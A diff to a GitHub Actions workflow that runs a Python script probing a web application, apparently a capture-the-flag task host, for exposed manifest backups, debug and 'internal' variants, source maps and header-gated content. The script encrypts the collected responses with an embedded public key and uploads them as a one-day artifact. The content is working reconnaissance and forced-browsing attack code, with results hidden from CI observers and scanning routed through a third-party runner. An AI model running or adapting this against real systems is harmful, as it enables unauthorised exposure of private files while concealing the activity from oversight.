@@ -12,7 +12,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Probe deployRef slug/assets and encrypt differences
+      - name: Probe known manifest backup/full variants and encrypt hits
         shell: bash
         run: |
           set -euo pipefail
@@ -30,39 +30,32 @@ jobs:
           -----END PUBLIC KEY-----
           PEM
           python3 - <<'PY'
-          import requests,pathlib,urllib.parse,json
+          import requests,pathlib,urllib.parse,json,itertools
           base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
           out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
-          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']
-          h={'X-Launchlet-Preview':boot['project'],'User-Agent':'Mozilla/5.0'}
-          inv=s.post(urllib.parse.urljoin(base,act['endpoint']),headers={**h,'Accept':'application/json','Content-Type':'application/json'},json={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}},timeout=15).json()
-          ref=inv['inspector']['deployRef']
-          paths=[
-            f'/{ref}',f'/{ref}/',f'/{ref}/index.html',f'/{ref}/manifest.json',f'/{ref}/deploy.json',f'/{ref}/build-manifest.json',
-            f'/assets/{ref}.json',f'/assets/{ref}.html',f'/assets/{ref}/manifest.json',f'/assets/{ref}/index.html',f'/assets/deploy-{ref}.json',f'/assets/deployment-{ref}.json',f'/assets/preview-{ref}.json',f'/assets/deploys/{ref}.json',f'/assets/deployments/{ref}.json',f'/assets/previews/{ref}.json',f'/assets/deploy/{ref}.json',f'/assets/preview/{ref}.json',f'/assets/artifacts/{ref}.json',
-            f'/static/{ref}',f'/static/{ref}.json',f'/static/{ref}.html',f'/static/{ref}/index.html',f'/static/deploy/{ref}',f'/static/preview/{ref}',f'/static/deploys/{ref}',f'/static/previews/{ref}',
-          ]
+          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); project=boot['project']
+          roots=['/assets/server-reference-manifest','/assets/build-manifest']
+          paths=set()
+          for root in roots:
+            paths.add(root+'.json')
+            for suffix in ['.json.bak','.json.old','.json.orig','.json.backup','.json.save','.json~','.json.tmp','.bak','.old','.orig','.backup','~','.tmp']:
+              paths.add(root+suffix)
+            for mid in ['full','internal','private','debug','dev','development','release','prod','production','enterprise','all','source','server','complete','raw','unfiltered','preview']:
+              paths.add(root+'.'+mid+'.json'); paths.add(root+'-'+mid+'.json'); paths.add(root+'_'+mid+'.json')
+            for ext in ['.map','.json.map','.txt','.yaml','.yml','.js']:
+              paths.add(root+ext)
+          # dotfile and directory-nearby variants
+          paths.update(['/assets/.server-reference-manifest.json','/assets/.build-manifest.json','/assets/server-references.json','/assets/server-actions.json','/assets/server-action-manifest.json','/assets/server-reference-manifest-full.json','/assets/server-reference-manifest-internal.json','/assets/build-manifest-full.json','/assets/build-manifest-internal.json'])
+          hsets=[{}, {'X-Launchlet-Preview':project}]
           hits=[]
-          for path in paths:
+          for path in sorted(paths):
+            for hi,h in enumerate(hsets):
               try:
-                  r=s.get(urllib.parse.urljoin(base,path),headers=h,timeout=10,allow_redirects=False)
-                  if r.status_code!=404: hits.append({'path':path,'status':r.status_code,'headers':dict(r.headers),'body':r.text[:30000]})
+                r=s.get(urllib.parse.urljoin(base,path),headers=h,timeout=8,allow_redirects=False)
+                if r.status_code!=404:
+                  hits.append({'path':path,'with_preview_header':bool(hi),'status':r.status_code,'headers':dict(r.headers),'body':r.text[:50000]})
               except Exception: pass
-          baseline=s.get(base,headers=h,timeout=10,allow_redirects=False)
-          queries=['deployRef','deploy_ref','deploy','deployment','preview','ref','id','build','artifact','previewRef','preview_ref']
-          for k in queries:
-              for v in [ref,boot['project']]:
-                  try:
-                      u=base+'?'+urllib.parse.urlencode({k:v}); r=s.get(u,headers=h,timeout=10,allow_redirects=False)
-                      if r.status_code!=baseline.status_code or r.text!=baseline.text:
-                          hits.append({'path':'/?'+urllib.parse.urlencode({k:v}),'status':r.status_code,'headers':dict(r.headers),'body':r.text[:30000]})
-                  except Exception: pass
-          # Same root with deploy-ref style headers.
-          for hk in ['X-Launchlet-Deploy','X-Launchlet-Deploy-Ref','X-Launchlet-Deployment','X-Launchlet-Ref','X-Launchlet-Preview-Ref','X-Deploy-Ref','X-Preview-Ref']:
-              r=s.get(base,headers={**h,hk:ref},timeout=10,allow_redirects=False)
-              if r.status_code!=baseline.status_code or r.text!=baseline.text:
-                  hits.append({'path':'/','request_header':{hk:ref},'status':r.status_code,'headers':dict(r.headers),'body':r.text[:30000]})
-          (out/'summary.json').write_text(json.dumps({'deployRef':ref,'hits':hits},indent=2))
+          (out/'summary.json').write_text(json.dumps({'count':len(paths),'hits':hits},indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
           openssl rand 32 > package/aes.key
@@ -78,6 +71,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-slug-encrypted
+          name: launchlet-part2-manifest-backups-encrypted
           path: artifact/
           retention-days: 1
